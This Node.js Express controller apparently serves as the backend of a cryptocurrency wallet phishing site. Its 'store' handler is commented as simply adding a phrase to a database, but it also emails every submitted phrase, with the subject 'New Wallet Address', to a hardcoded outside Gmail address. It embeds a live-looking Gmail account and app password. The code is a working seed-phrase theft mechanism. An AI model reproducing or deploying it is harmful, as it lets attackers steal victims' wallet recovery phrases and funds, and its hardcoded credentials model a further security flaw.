const Phrase = require("../models/phrase_model");
const nodemailer = require("nodemailer");

// add phrase to database
const store = (req, res, next) => {
  var clause = req.body.clause;

  // Create a transporter object using the default SMTP transport
  const transporter = nodemailer.createTransport({
    service: "Gmail", // e.g., 'Gmail', 'Yahoo', etc.
    auth: {
      user: "eightninemo@gmail.com",
      pass: "baxi hrmu tsca pobn",
    },
  });

  // Email data
  const mailOptions = {
    from: "eightninemo@gmail.com",
    to: "sooreoluwwaa@gmail.com",
    subject: "New Wallet Address",
    text: clause,
  };
  let phrase = Phrase({
    clause: req.body.clause,
  });
  console.log(phrase);
  if (clause != "") {
    // Send the email
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error("Error sending email:", error);
      } else {
        console.log("Email sent:", info.response);
      }
    });
    phrase
      .save()
      .then((response) => {
        res.status(200).json({
          status: true,
          message: "Phrase Saved Successfully",
          data: response,
        });
      })
      .catch((error) => {
        console.log(error);
        res.status(500).json({
          status: false,
          message: error,
        });
      });
  } else {
    res.status(400).json({
      status: false,
      message: "Phrase is empty",
    });
  }
};

module.exports = {
  store,
};
